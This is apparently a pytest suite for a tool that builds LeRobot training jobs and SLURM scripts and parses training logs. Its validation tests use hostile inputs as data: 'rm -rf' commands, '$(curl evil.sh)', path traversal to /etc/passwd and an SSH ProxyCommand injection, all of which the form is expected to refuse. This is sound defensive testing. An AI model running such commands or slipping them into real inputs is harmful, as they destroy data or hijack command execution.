"""Train: the job form, the lerobot-train flags (parsed by LeRobot's own config class), the SLURM
script, the training log parser, and what the checks refuse."""

from __future__ import annotations

import importlib.util
import json
import logging
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from phi_studio import train
from phi_studio.train import (
    POLICIES_060,
    FormError,
    Job,
    LogState,
    Settings,
    mac_command,
    resume_args,
    sbatch_script,
    train_args,
)

HAS_LEROBOT = importlib.util.find_spec("lerobot") is not None
needs_lerobot = pytest.mark.skipif(not HAS_LEROBOT, reason="LeRobot is not installed here")
STAMP = "20261004-190000"


def job(**kw) -> Job:
    base = {"where": "cluster", "dataset": "Parv-09/cubes", "policy": "act", "steps": 1000,
            "batch_size": 8, "save_freq": 500, "name": "act-cubes", "stamp": STAMP, "parts": 1}
    return Job.from_dict({**base, **kw}, POLICIES_060)


def settings(**kw) -> Settings:
    return Settings(**{"remote_user": "patodia.pa", **kw}).validate()


def script(j: Job, s: Settings | None = None) -> str:
    s = s or settings()
    return sbatch_script(j, s, f"{s.base()}/runs/{j.run_id}")


# -- the form and the settings ---------------------------------------------------------------------
def test_defaults_are_valid_and_point_at_the_users_scratch() -> None:
    s = settings()
    assert s.base() == "/scratch/patodia.pa/phi-studio"
    assert s.env_name() == "lerobot-gpu"
    assert s.time == "08:00:00" and s.partition == "gpu"


@pytest.mark.parametrize(
    "field,value",
    [
        ("dataset", "a/b; rm -rf ~"),
        ("dataset", "../../etc/passwd"),
        ("dataset", "no-slash"),
        ("dataset", "a/b c"),
        ("dataset", "-x/y"),
        ("dataset", "a/b\n--policy.device=cpu"),
        ("name", "x$(reboot)"),
        ("name", "x\ny"),
        ("name", "has space"),
        ("name", "-starts-with-dash"),
        ("policy", "act --policy.device=cpu"),
        ("policy", "not_a_policy"),
        ("steps", "1000; rm -rf /"),
        ("steps", 0),
        ("steps", True),
        ("batch_size", 1.5),
        ("parts", 9),
        ("stamp", "now"),
        ("pretrained", "lerobot/smolvla_base`id`"),
    ],
)
def test_the_job_form_refuses_anything_outside_its_pattern(field, value) -> None:
    with pytest.raises(FormError) as e:
        job(**{field: value})
    assert field in e.value.errors


def test_pushing_needs_a_repo_id_before_the_job_queues() -> None:
    with pytest.raises(FormError) as e:
        job(push=True)
    assert "repo_id" in e.value.errors
    j = job(push=True, repo_id="Parv-09/act_cubes")
    a = train_args(j, device="cuda", output_dir="/x/y/train", cluster=True)
    assert "--policy.push_to_hub=true" in a and "--policy.repo_id=Parv-09/act_cubes" in a
    # WHY always passed: LeRobot defaults push_to_hub to True (configs/policies.py:70).
    assert "--policy.push_to_hub=false" in train_args(job(), device="cuda", output_dir="/x/y/t",
                                                      cluster=True)  # fmt: skip


@pytest.mark.parametrize(
    "line",
    [
        "export A=$(curl evil.sh)",
        "export A=`id`",
        "module load x; rm -rf ~",
        "source activate env && curl x",
        "export A=1 | tee x",
        "export A=1 > /etc/x",
        "rm -rf /scratch",
        "python -c 'print(1)'",
        "export A='quoted value'",
    ],
)
def test_env_setup_takes_only_env_lines(line) -> None:
    with pytest.raises(FormError) as e:
        Settings(env=train.DEFAULT_ENV + "\n" + line).validate()
    assert "env" in e.value.errors


@pytest.mark.parametrize(
    "field,value",
    [
        ("host", "-oProxyCommand=touch /tmp/x"),
        ("host", "hpc evil"),
        ("remote_base", "/"),
        ("remote_base", "/scratch/../etc"),
        ("remote_base", "relative/path"),
        ("remote_base", "/scratch/a b"),
        ("gres", "gpu:1\n#SBATCH --qos=high"),
        ("mem", "64G; reboot"),
        ("time", "09:00:00"),
        ("time", "8h"),
        ("partition", "gpu;id"),
        ("exclude", "d1025 && id"),
        ("cpus", "16; id"),
    ],
)
def test_settings_refuse_injection_and_over_long_parts(field, value) -> None:
    with pytest.raises(FormError) as e:
        Settings(**{field: value}).validate()
    assert field in e.value.errors


@pytest.mark.parametrize("field", ["host", "gres", "mem", "time", "partition", "remote_base"])
def test_a_trailing_newline_does_not_slip_past_a_pattern(field) -> None:
    good = {"host": "hpc", "gres": "gpu:1", "mem": "64G", "time": "08:00:00", "partition": "gpu",
            "remote_base": "/scratch/u/x"}  # fmt: skip
    Settings(**{field: good[field]}).validate()
    with pytest.raises(FormError):
        Settings(**{field: good[field] + "\n"}).validate()


def test_a_part_longer_than_the_partition_allows_is_refused() -> None:
    with pytest.raises(FormError):
        Settings(time="08:00:01").validate()
    assert Settings(time="08:00:00").validate().time == "08:00:00"


# -- the script ------------------------------------------------------------------------------------
def test_one_part_script_starts_or_resumes_and_has_no_chain() -> None:
    text = script(job())
    run = "/scratch/patodia.pa/phi-studio/runs/act-cubes-20261004-190000"
    assert "#SBATCH --partition=gpu" in text and "#SBATCH --time=08:00:00" in text
    assert f"#SBATCH --output={run}/logs/%x-%j.out" in text
    assert "source activate lerobot-gpu" in text
    assert f"--config_path={run}/train/checkpoints/last/pretrained_model/train_config.json" in text
    assert "--resume=true" in text
    assert 'FINAL="$OUT/checkpoints/001000/pretrained_model"' in text
    assert "scancel" not in text
    assert text.rstrip().endswith("exit $RC")


def test_chained_parts_share_one_script_and_cancel_the_rest_when_done() -> None:
    j = job(parts=3, steps=100_000, save_freq=10_000)
    text = script(j)
    assert "part ${PHI_PART:-1} of 3" in text
    assert "for name in act-cubes-20261004-190000-p2 act-cubes-20261004-190000-p3; do" in text
    assert '--state=PENDING' in text
    p = train.plan(j, settings())
    assert p["total_hours"] == 24.0
    assert p["names"] == [f"act-cubes-{STAMP}-p{k}" for k in (1, 2, 3)]


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize("parts", [1, 4])
def test_the_script_is_valid_bash(parts, tmp_path) -> None:
    f = tmp_path / "job.sbatch"
    f.write_text(script(job(parts=parts, push=True, repo_id="Parv-09/x")))
    r = subprocess.run(["bash", "-n", str(f)], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr


def test_the_script_runs_its_resume_branch(tmp_path) -> None:
    """Run the script with stub srun/scancel/module/source on PATH: with a checkpoint present it
    resumes; with the final checkpoint it exits at once and cancels the later parts."""
    if shutil.which("bash") is None:
        pytest.skip("needs bash")
    base = tmp_path / "b"
    s = Settings(remote_base=str(base), env="module load x\nexport A=1").validate()
    j = job(parts=2, steps=6, save_freq=3)
    run_dir = f"{base}/runs/{j.run_id}"
    text = sbatch_script(j, s, run_dir)
    bin_ = tmp_path / "bin"
    bin_.mkdir()
    log = tmp_path / "calls"
    for tool in ("srun", "scancel", "module"):
        (bin_ / tool).write_text(f'#!/bin/bash\necho "{tool} $*" >> {log}\n')
        (bin_ / tool).chmod(0o755)
    f = tmp_path / "job.sh"
    # module is a shell function on the cluster; here a stub on PATH stands in for it
    f.write_text(text)
    out = Path(run_dir) / "train" / "checkpoints"
    (out / "000003" / "pretrained_model").mkdir(parents=True)
    (out / "000003" / "pretrained_model" / "train_config.json").write_text("{}")
    (out / "last").symlink_to("000003")
    env = {"PATH": f"{bin_}:/usr/bin:/bin", "SLURM_JOB_ID": "77", "PHI_PART": "2", "USER": "u",
           "HOME": str(tmp_path)}  # fmt: skip
    r = subprocess.run(["bash", str(f)], capture_output=True, text=True, env=env)
    assert r.returncode == 0, r.stderr
    assert "resuming from step 3" in r.stdout
    calls = log.read_text()
    assert f"srun lerobot-train --config_path={run_dir}/train/checkpoints/last" in calls
    assert "scancel" not in calls  # not finished: the final checkpoint does not exist
    (out / "000006" / "pretrained_model").mkdir(parents=True)
    log.unlink()
    r = subprocess.run(["bash", str(f)], capture_output=True, text=True, env=env)
    assert r.returncode == 0 and "already reached step 6" in r.stdout
    assert not log.exists() or "srun" not in log.read_text()


def test_the_mac_command_runs_on_mps_and_keeps_a_log(tmp_path) -> None:
    j = job(where="mac", dataset="Parv-09/Ava_1.0_20260730_172156")
    cmd = mac_command(j, tmp_path / j.run_id)
    head, _, tee = cmd.partition(" 2>&1 | tee -a ")
    args = shlex.split(head)
    assert args[0] == "lerobot-train" and "--policy.device=mps" in args
    assert "--dataset.video_backend=pyav" not in args  # the cluster-only fix
    assert shlex.split(tee) == [str(tmp_path / j.run_id / "train.log")]


def test_a_pretrained_start_replaces_the_type_flag() -> None:
    a = train_args(job(pretrained="lerobot/smolvla_base"), device="cuda", output_dir="/a/b/t",
                   cluster=True)  # fmt: skip
    assert "--policy.path=lerobot/smolvla_base" in a
    assert not any(x.startswith("--policy.type") for x in a)


def test_log_freq_gives_about_a_hundred_points() -> None:
    assert job(steps=1000).log_freq == 10
    assert job(steps=100_000).log_freq == 200  # LeRobot's own default
    assert job(steps=50, save_freq=50).log_freq == 1


# -- LeRobot's own parser --------------------------------------------------------------------------
def _parse(args: list[str], monkeypatch):
    """Parse with the config class lerobot-train uses, then validate(), as train() does."""
    import draccus
    from lerobot.configs.train import TrainPipelineConfig
    from lerobot.scripts import lerobot_train  # noqa: F401  registers every config, as the CLI

    monkeypatch.setattr(sys, "argv", ["lerobot-train", *args])
    cfg = draccus.parse(config_class=TrainPipelineConfig, args=args)
    cfg.validate()
    return cfg


@needs_lerobot
@pytest.mark.parametrize("policy", POLICIES_060)
def test_every_policys_cluster_flags_parse_with_lerobot(policy, monkeypatch, tmp_path) -> None:
    a = train_args(job(policy=policy), device="cuda", output_dir=str(tmp_path / "train"),
                   cluster=True, workers=16)  # fmt: skip
    cfg = _parse(a, monkeypatch)
    assert cfg.policy.type == policy and cfg.policy.push_to_hub is False
    assert cfg.steps == 1000 and cfg.save_freq == 500 and cfg.log_freq == 10
    assert cfg.dataset.video_backend == "pyav" and cfg.num_workers == 16
    assert cfg.wandb.enable is False


@needs_lerobot
def test_mac_flags_parse_and_keep_mps_when_the_mac_has_it(monkeypatch, tmp_path) -> None:
    import torch

    j = job(where="mac", push=True, repo_id="Parv-09/x", wandb=True)
    head = mac_command(j, tmp_path / j.run_id).partition(" 2>&1 |")[0]
    monkeypatch.setenv("WANDB_MODE", "disabled")
    cfg = _parse(shlex.split(head)[1:], monkeypatch)
    assert cfg.policy.repo_id == "Parv-09/x" and cfg.policy.push_to_hub is True
    if torch.backends.mps.is_available():
        assert cfg.policy.device == "mps"


@needs_lerobot
def test_lerobot_itself_refuses_push_without_a_repo_id(monkeypatch, tmp_path) -> None:
    """The rule the form checks early is LeRobot's (configs/train.py:260-266)."""
    a = train_args(job(), device="cpu", output_dir=str(tmp_path / "t"), cluster=False)
    a = [x for x in a if not x.startswith("--policy.push_to_hub")] + ["--policy.push_to_hub=true"]
    with pytest.raises(ValueError, match="repo_id"):
        _parse(a, monkeypatch)


@needs_lerobot
def test_resume_flags_go_through_lerobots_cli_wrapper(monkeypatch, tmp_path) -> None:
    """Write a real train_config.json the way a checkpoint holds it, then parse the resume flags
    through parser.wrap, the exact path lerobot-train takes (configs/parser.py:273-321)."""
    from lerobot.configs import parser
    from lerobot.configs.train import TrainPipelineConfig

    out = tmp_path / "train"
    cfg = _parse(train_args(job(), device="cpu", output_dir=str(out), cluster=False), monkeypatch)
    ckpt = out / "checkpoints" / "000500" / "pretrained_model"
    ckpt.mkdir(parents=True)
    cfg._save_pretrained(ckpt)
    (out / "checkpoints" / "last").symlink_to("000500")
    args = resume_args(str(out))
    monkeypatch.setattr(sys, "argv", ["lerobot-train", *args])
    got: list[TrainPipelineConfig] = []

    def entry(c: TrainPipelineConfig) -> None:
        got.append(c)

    # WHY: parser.wrap reads the argument's type from the annotations, which this module's
    # `from __future__ import annotations` turns into a string.
    entry.__annotations__ = {"c": TrainPipelineConfig, "return": None}
    parser.wrap()(entry)()
    c = got[0]
    c.validate()
    assert c.resume is True and c.steps == 1000 and c.policy.type == "act"
    assert c.checkpoint_path == out / "checkpoints" / "last"


@needs_lerobot
def test_the_fallback_policy_list_is_lerobots_registry() -> None:
    import lerobot.policies  # noqa: F401  registers the configs
    from lerobot.configs.policies import PreTrainedConfig

    assert tuple(sorted(PreTrainedConfig.get_known_choices())) == POLICIES_060


@needs_lerobot
def test_the_probe_reads_policies_and_extras_from_lerobot() -> None:
    r = subprocess.run([sys.executable, "-c", train.PROBE], capture_output=True, text=True,
                       timeout=300)  # fmt: skip
    assert r.returncode == 0, r.stderr[-2000:]
    p = train.read_probe(r.stdout)
    types = {x["type"]: x for x in p["policies"]}
    assert set(types) == set(POLICIES_060)
    assert types["smolvla"]["extra"] == "smolvla" and types["pi05"]["extra"] == "pi"
    assert types["act"]["extra"] is None
    assert "num2words" in p["needs"]["smolvla"] and "transformers" in p["needs"]["smolvla"]
    assert "diffusers" in p["needs"]["diffusion"]


def test_extras_resolve_through_nested_lerobot_extras() -> None:
    reqs = ['transformers<5.6.0,>=5.4.0; extra == "transformers-dep"',
            'lerobot[transformers-dep]; extra == "smolvla"',
            'num2words<0.6.0,>=0.5.14; extra == "smolvla"',
            'lerobot[transformers-dep]; extra == "pi"', 'scipy; extra == "pi"',
            'wandb<0.28; extra == "training"', 'draccus==0.10.0']  # fmt: skip
    needs = train.extra_needs(reqs)
    assert needs["smolvla"] == {"transformers", "num2words"}
    assert train.policy_extra("pi0_fast", needs) == "pi"
    assert train.missing_for("smolvla", needs, {"transformers", "wandb"}) == ["num2words"]
    listing = ("num2words-0.5.14.dist-info torch-2.11.0+cu128.dist-info "
               "typing_extensions-4.1.dist-info")
    assert train.dist_names(listing) == {"num2words", "torch", "typing-extensions"}


# -- the log ---------------------------------------------------------------------------------------
# Lines copied verbatim (a selection) from a real 6-step run on this Mac (lerobot-train 0.6.0,
# lerobot/pusht, act, mps), tqdm bar included, as the terminal wrote them to the tee log.
REAL = """\
INFO 2026-10-04 16:03:15 ot_train.py:404 cfg.steps=6 (6)
Training:   0%|          | 0/6 [00:00<?, ?step/s]INFO 2026-10-04 16:03:15 ot_train.py:562 Start offline training on a fixed dataset, with effective batch size: 2
Training:  17%|█▋        | 1/6 [00:07<00:39,  7.91s/step]INFO 2026-10-04 16:03:23 ot_train.py:606 step:1 smpl:2 ep:0 epch:0.00 loss:105.928 grdn:1600.160 lr:1.0e-05 updt_s:7.543 data_s:0.365 smp/s:0
INFO 2026-10-04 16:03:23 ot_train.py:606 step:2 smpl:4 ep:0 epch:0.00 loss:78.604 grdn:1423.651 lr:1.0e-05 updt_s:0.046 data_s:0.010 smp/s:36
Training:  50%|█████     | 3/6 [00:08<00:06,  2.09s/step]INFO 2026-10-04 16:03:23 ot_train.py:606 step:3 smpl:6 ep:0 epch:0.00 loss:63.270 grdn:1190.512 lr:1.0e-05 updt_s:0.043 data_s:0.008 smp/s:39
INFO 2026-10-04 16:03:23 ot_train.py:651 Checkpoint policy after step 3
INFO 2026-10-04 16:03:23 ot_train.py:606 step:4 smpl:8 ep:0 epch:0.00 loss:47.959 grdn:974.029 lr:1.0e-05 updt_s:0.045 data_s:0.016 smp/s:33
Training:  83%|████████▎ | 5/6 [00:08<00:01,  1.13s/step]INFO 2026-10-04 16:03:23 ot_train.py:606 step:5 smpl:10 ep:0 epch:0.00 loss:44.782 grdn:887.352 lr:1.0e-05 updt_s:0.043 data_s:0.013 smp/s:35
INFO 2026-10-04 16:03:23 ot_train.py:606 step:6 smpl:12 ep:0 epch:0.00 loss:31.742 grdn:659.074 lr:1.0e-05 updt_s:0.045 data_s:0.014 smp/s:34
INFO 2026-10-04 16:03:23 ot_train.py:651 Checkpoint policy after step 6
Training: 100%|██████████| 6/6 [00:08<00:00,  1.47s/step]
INFO 2026-10-04 16:03:24 ot_train.py:737 End of training
"""  # noqa: E501


def test_real_lines_parse_with_tqdm_on_the_same_line() -> None:
    st = LogState(log_freq=1, total=0)
    st.feed(REAL)
    assert [p["step"] for p in st.points] == [1, 2, 3, 4, 5, 6]
    assert st.points[0]["loss"] == 105.928 and st.points[0]["lr"] == 1e-05
    assert st.total == 6 and st.ended and "End of training" in st.ended
    assert all(p["sure"] for p in st.points)


def test_a_line_split_across_two_reads_is_parsed_once() -> None:
    st = LogState(log_freq=1, total=6)
    cut = REAL.index("loss:78.604") + 3
    st.feed(REAL[:cut])
    n = len(st.points)
    st.feed(REAL[cut:])
    assert [p["step"] for p in st.points] == [1, 2, 3, 4, 5, 6] and n == 1


def _line(step: str, loss: float, t: str = "16:00:00") -> str:
    return (f"INFO 2026-10-04 {t} ot_train.py:606 step:{step} smpl:1K ep:2 epch:0.10 "
            f"loss:{loss:.3f} grdn:1.000 lr:1.0e-04 updt_s:0.300 data_s:0.005")


def test_rounded_steps_are_recovered_from_log_freq_and_anchors() -> None:
    """LeRobot prints 1 200 as "1K". Counting log_freq from an exact anchor recovers it."""
    st = LogState(log_freq=200, total=100_000)
    # format_big_number(1400) is "1K" and 1600 is "2K" (utils/utils.py:102, precision 0)
    st.feed("\n".join([_line("800", 1.0), _line("1K", 0.9), _line("1K", 0.8), _line("1K", 0.7),
                       _line("2K", 0.6), ""]))  # fmt: skip
    assert [p["step"] for p in st.points] == [800, 1000, 1200, 1400, 1600]
    st.feed("phi-studio: resuming from step 20000\n" + _line("20K", 0.5) + "\n")
    assert st.points[-1]["step"] == 20_200 and st.points[-1]["sure"]
    st2 = LogState(log_freq=200, total=100_000)  # no anchor: the shown value, marked unsure
    st2.feed(_line("35K", 0.4) + "\n")
    assert st2.points[0]["step"] == 35_000 and not st2.points[0]["sure"]


# Verbatim from an Explorer run (smolvla, 20 000 steps, batch 64, log_freq 200, job 9017370): steps
# 2 000 to 2 800, printed as "2K" and "3K", with a checkpoint at 2 500 between two metrics lines.
CLUSTER = """\
INFO 2026-08-08 15:08:45 ot_train.py:404 cfg.steps=20000 (20K)
INFO 2026-08-08 15:23:49 ot_train.py:606 step:2K smpl:128K ep:229 epch:2.12 loss:0.111 grdn:1.272 lr:9.8e-05 updt_s:0.413 data_s:0.043 smp/s:140 mem_gb:19.87
INFO 2026-08-08 15:25:13 ot_train.py:606 step:2K smpl:141K ep:252 epch:2.34 loss:0.105 grdn:1.250 lr:9.7e-05 updt_s:0.405 data_s:0.011 smp/s:154 mem_gb:19.88
INFO 2026-08-08 15:26:36 ot_train.py:606 step:2K smpl:154K ep:275 epch:2.55 loss:0.102 grdn:1.259 lr:9.7e-05 updt_s:0.402 data_s:0.011 smp/s:155 mem_gb:19.88
INFO 2026-08-08 15:28:08 ot_train.py:651 Checkpoint policy after step 2500
INFO 2026-08-08 15:29:16 ot_train.py:606 step:3K smpl:166K ep:298 epch:2.76 loss:0.100 grdn:1.290 lr:9.6e-05 updt_s:0.462 data_s:0.016 smp/s:134 mem_gb:20.21
INFO 2026-08-08 15:30:50 ot_train.py:606 step:3K smpl:179K ep:321 epch:2.97 loss:0.094 grdn:1.198 lr:9.6e-05 updt_s:0.454 data_s:0.014 smp/s:137 mem_gb:20.55
"""  # noqa: E501


def test_a_checkpoint_between_log_lines_keeps_the_steps_on_log_freq() -> None:
    st = LogState(log_freq=200, total=0)
    st.feed("phi-studio: resuming from step 1800\n" + CLUSTER)
    assert st.total == 20_000
    assert [p["step"] for p in st.points] == [2000, 2200, 2400, 2600, 2800]
    assert all(p["sure"] for p in st.points)


def test_a_resumed_part_replaces_the_steps_it_redoes() -> None:
    """Part 1 logged up to 2 800 but its last checkpoint is 2 500, so part 2 redoes 2 600 and
    2 800. The chart keeps part 2's values and its steps never go backwards."""
    st = LogState(log_freq=200, total=0)
    st.feed("phi-studio: resuming from step 1800\n" + CLUSTER)
    st.feed("phi-studio: resuming from step 2500\n"
            + "\n".join([_line("3K", 0.5), _line("3K", 0.4), _line("3K", 0.3), ""]))  # fmt: skip
    assert [p["step"] for p in st.points] == [2000, 2200, 2400, 2600, 2800, 3000]
    assert [p["loss"] for p in st.points[3:]] == [0.5, 0.4, 0.3]


def test_eta_from_the_step_rate_of_the_current_part() -> None:
    st = LogState(log_freq=100, total=10_000)
    st.feed("phi-studio: starting at step 0\n")
    st.feed(_line("100", 2.0, "16:00:00") + "\n" + _line("200", 1.5, "16:00:10") + "\n")
    s = st.summary()
    assert s["step"] == 200 and s["rate"] == pytest.approx(10.0)
    assert s["eta_s"] == 980  # (10 000 - 200) / 10 steps per second


@needs_lerobot
def test_lines_made_by_lerobots_own_formatter_parse_exactly(tmp_path) -> None:
    """Format with LeRobot's MetricsTracker and init_logging, the code that writes the real log
    (utils/logging_utils.py:190, utils/utils.py:64), and recover every exact step."""
    from lerobot.utils.logging_utils import AverageMeter, MetricsTracker
    from lerobot.utils.utils import init_logging

    root = logging.getLogger()
    saved = (root.handlers[:], root.level)
    try:
        f = tmp_path / "train.log"
        init_logging(log_file=f, console_level="CRITICAL")
        meters = {"loss": AverageMeter("loss", ":.3f"), "grad_norm": AverageMeter("grdn", ":.3f"),
                  "lr": AverageMeter("lr", ":0.1e")}  # fmt: skip
        t = MetricsTracker(8, 50_000, 100, meters)
        want = []
        for step in range(1, 3001):
            t.step()
            if step % 200 == 0:
                t.loss, t.grad_norm, t.lr = 1.0 / step, 1.0, 1e-4
                logging.info(t)
                t.reset_averages()
                want.append(step)
        for h in root.handlers:
            h.flush()
        text = f.read_text()
    finally:
        root.handlers[:] = saved[0]
        root.setLevel(saved[1])
    assert "step:1K" in text  # the rounding Studio has to undo
    st = LogState(log_freq=200, total=3000)
    st.feed(text)
    assert [p["step"] for p in st.points] == want
    assert st.points[-1]["loss"] == pytest.approx(1 / 3000, abs=5e-4)


# -- stores ----------------------------------------------------------------------------------------
def test_store_writes_atomically_and_survives_a_damaged_file(tmp_path) -> None:
    st = train.Store(tmp_path)
    assert st.runs() == [] and st.settings().host == "hpc"
    r = train.new_run(job())
    st.put(r)
    r["error"] = {"x": 1}
    st.put(r)
    assert len(st.runs()) == 1 and st.run(r["id"])["error"] == {"x": 1}
    st.jobs_path.write_text("{not json")
    assert st.runs() == []
    assert any(p.name.startswith("train_jobs.json.damaged-") for p in tmp_path.iterdir())
    st.save_settings(settings(host="hpc2"))
    assert json.loads(st.settings_path.read_text())["host"] == "hpc2"


def test_local_datasets_are_found_under_lerobots_home(tmp_path) -> None:
    d = tmp_path / "Parv-09" / "Ava_1" / "meta"
    d.mkdir(parents=True)
    (d / "info.json").write_text(json.dumps({"total_episodes": 3, "total_frames": 90, "fps": 30}))
    (tmp_path / "hub" / "x" / "meta").mkdir(parents=True)
    (tmp_path / "calibration").mkdir()
    got = train.local_datasets(tmp_path)
    assert got == [{"id": "Parv-09/Ava_1", "episodes": 3, "frames": 90, "fps": 30}]
